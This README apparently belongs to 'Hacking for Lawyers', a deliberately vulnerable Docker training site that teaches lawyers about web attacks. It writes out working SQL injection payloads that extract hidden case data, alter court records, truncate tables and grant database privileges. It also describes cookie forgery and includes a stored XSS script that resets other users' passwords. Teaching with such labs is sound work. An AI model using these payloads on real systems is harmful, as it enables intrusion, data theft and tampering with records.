# Hacking for Lawyers

## Running the Site
The website is in docker and uses the mattrayner lamp stack. Run the code below to launch the site 
```
docker-compose build
```
If you don't want to have a permanent mysql db outside the container then get rid of the second -v tag.
```
docker-compose up -d
```
There is a shell script in the app folder called create_sql.sh. This will drop the websitedata table if it exists and reinstall from a sql file in the mysql_tables folder in app.
```
docker exec -it hacking4lawyers_webapp_1 bash
cd app
bash create_sql.sh 
```


# Topics Covered
## Case Search Page

### Case Search JavaScript Manipulation

Although the dropdown on the case search page only has the options of 5 or 10 results. 
You can use inspect on chrome to modify the value of the dropdown to be any number.

### Case Search SQL Injection Queries

```
Type this into the case number search box. It can also be typed into the url as a get parameter.

Step 1: Find the custom schema and return as the case number by continually adding 'test' as test until the columns match up.
fakecasenumber' UNION ALL SELECT GROUP_CONCAT(concat(schema_name)separator ';'),'test','test','test','test','test','test','test','test' FROM INFORMATION_SCHEMA.schemata WHERE '1'='1

Step 2: Get all the table names from that custom schema.
fakecasenumber' UNION ALL SELECT GROUP_CONCAT(concat(TABLE_NAME)separator ';'),'test','test','test','test','test','test','test','test' FROM INFORMATION_SCHEMA.TABLES WHERE table_schema ='websitedata

Step 3: Get all the column names from that table
fakecasenumber' UNION ALL SELECT GROUP_CONCAT(concat(COLUMN_NAME)separator ';'),'test','test','test','test','test','test','test','test' FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME ='casedata

Step 4: Now that we have all the column names for case data we can return different items. We notice the number of columns is also the number needed for the select statement so we assume they are using an *
We also notice a column that is not displayed anywhere called "Judge". We can replace case description with Judge to print out who the Judge will be.
fakecasenumber' UNION ALL SELECT Case_Number,Case_Type,Plaintiff_Name,Plaintiff_Address,Defendant_Name,Defendant_Address,Hearing_Date,CONCAT("Judge:", Judge) as Case_Description,'test' From casedata WHERE Case_Number = '12C934902

Step 5: We notice on domestic violence cases the plaintiff addres isn't shown. Using the same trick as before we can show the plaintiff address as case description
fakecasenumber' UNION ALL SELECT Case_Number,Case_Type,Plaintiff_Name,Plaintiff_Address,Defendant_Name,Defendant_Address,Hearing_Date,CONCAT("Plaintiffs Address: ",Plaintiff_Address) as Case_Description,Judge From casedata WHERE Case_Number = '12C934902

Step 6: We test to see if it will let us run multiple queries. If the permissions aren't set right we can update or delte out information.
//Resets the hearing date for a month earlier.
fakecasenumber'; UPDATE casedata SET Hearing_Date = '10/25/2019' WHERE Case_Number = '12C934910

Step 7: We can update the defendants name to something else
//Updates the defendants name in a criminal case
fakecasenumber'; UPDATE casedata SET Defendant_Name = 'John Smith' WHERE Case_Number = '12C934910

Step 8: We can wipe out all the data using truncate.
fakecasenumber'; TRUNCATE casedata; SELECT * FROM casedata WHERE Case_Number = '12C9349010

Step 9: Finally we can create a new user so we can simply login ourselves to more directly control the mysql server.
fakecasenumber'; GRANT ALL PRIVILEGES ON *.* TO 'hackerman'@'localhost' IDENTIFIED BY 'password
```

## Blog Post Site

### Cookie Manipulation
When the user logs in a cookie is set with the users username. This can be modified to be any user, thus becoming that user.

### SQL Injection

This can be done through modifying the username in the cookie

Test if sql injection works
```
mstubenberg' OR '1' = '1
```
Replace password for user
```
fakeuser' UNION ALL SELECT "test" as test,password FROM users WHERE username = 'attorney1
```
Get all the users information using ID
```
fakeuser' UNION ALL SELECT username,password FROM users WHERE ID = '2
```
### JavaScript Injection

You can add javascript directly into the text box for a post which is then executed by the users browser.

Testing if it's possible
```
<script>
console.log("It worked!");
</script>
```

Script to change the password of the user and then log them out unless they are the user "hackerman"
Note: This one should be dropped as an example because it then prohibits any of the audience from playing with the site.
```
    <script>
       setTimeout(function(){
           console.log("It worked");
           if($("#accountinfousername").text() != "hackerman"){
                if($("#logoutbutton").length > 0 && $("#resetpasswordsuccess").length == 0){
                    $("#resetpassword").val("pa$$word");
                    $("#resetpasswordbutton").click();
                }else if($("#resetpasswordsuccess").length > 0){
                    $("#logoutbutton").click();
                }else{
                    console.log("Waiting for user to login");
                }
            }

        },1000); 
    </script>
```

## To Do:
1. I think the blog site should have additional options if the user is "admin". Then using the cookie trick you can log in as admin and delete posts.
2. I think real world examples of each of these would be useful. Show an example then show a news clip of a company that actually had this vulnerability.
3. I'd like to demonstrate a man in the middle attack. Maybe brining our own wireless network? 
4. Showing a password cracker live in the background somehow that we start at the beginning and check how many we've cracked at the end would be cool.
